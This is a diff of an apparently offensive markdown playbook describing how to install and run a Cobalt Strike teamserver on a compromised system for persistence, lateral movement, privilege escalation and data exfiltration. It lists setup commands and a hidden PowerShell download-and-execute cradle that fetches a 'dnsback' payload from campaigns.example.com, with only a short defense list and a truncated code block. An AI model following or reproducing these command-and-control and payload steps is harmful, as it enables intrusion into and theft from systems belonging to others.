@@ -42,11 +42,15 @@ Technical Description: Cobalt Strike consists of a client and a server component
 
 Business Value: Cobalt Strike is a powerful tool for attackers looking to maintain a persistent presence within a network. The tool provides a wide range of post-exploitation capabilities that can be used to move laterally within a network, escalate privileges, and exfiltrate sensitive data. By using Cobalt Strike, attackers can evade detection and maintain access to compromised systems for extended periods of time.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised system
 
 1. Ability to execute the Cobalt Strike Team Server binary
+
+ 
 
 ## Defense
 
@@ -56,6 +60,8 @@ Business Value: Cobalt Strike is a powerful tool for attackers looking to mainta
 
 1. Use endpoint detection and response (EDR) tools to detect and respond to malicious activity
 
+ 
+
 ## Objectives
 
 1. Install and execute the Cobalt Strike Team Server on a compromised system
@@ -64,14 +70,24 @@ Business Value: Cobalt Strike is a powerful tool for attackers looking to mainta
 
 1. Execute a variety of post-exploitation activities, such as lateral movement, privilege escalation, and data exfiltration
 
+ 
+
 # Instructions
 
 1. Install and execute Cobalt Strike Team Server
 
+ 
+
+
+
 **Code**: [[$ sudo apt-get update
 $ sudo apt-get install openj]]
 
+
+
 > This command installs and executes Cobalt Strike Team Server. The command begins with updating the package index of the system using 'sudo apt-get update' command. Then, it installs the OpenJDK 11 JDK using 'sudo apt-get install openjdk-11-jdk' command. After that, it installs Proxychains and Socat using 'sudo apt install proxychains socat' command. Next, it sets the default Java version to 1.11.0 using 'sudo update-java-alternatives -s java-1.11.0-openjdk-amd64' command. Then, it executes the Cobalt Strike Team Server using './teamserver 10.10.10.10 "password" [malleable C2 profile]' command. Finally, it executes the Cobalt Strike client using './cobaltstrike' command and downloads and executes the 'dnsback' PowerShell script using 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"' command.
+
+
 
 **Command** ([[Update and Install OpenJDK]]):
 
@@ -80,11 +96,19 @@ $ sudo apt-get update
 $ sudo apt-get install openjdk-11-jdk
 ```
 
+
+
+
+
 **Command** ([[Install Proxychains and Socat]]):
 
 ```bash
 $ sudo apt install proxychains socat
 ```
+
+
+
+
 
 **Command** ([[Set Java Alternatives]]):
 
@@ -92,11 +116,19 @@ $ sudo apt install proxychains socat
 $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
 ```
 
+
+
+
+
 **Command** ([[Start Teamserver]]):
 
 ```bash
 $ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
 ```
+
+
+
+
 
 **Command** ([[Start Cobalt Strike]]):
 
@@ -104,11 +136,17 @@ $ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
 $ ./cobaltstrike
 ```
 
+
+
+
+
 **Command** ([[Download and Execute DNSBack Payload]]):
 
 ```bash
 $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -137,3 +175,5 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
 ## Tags
 
 - [[Cobalt Strike]]
+
+
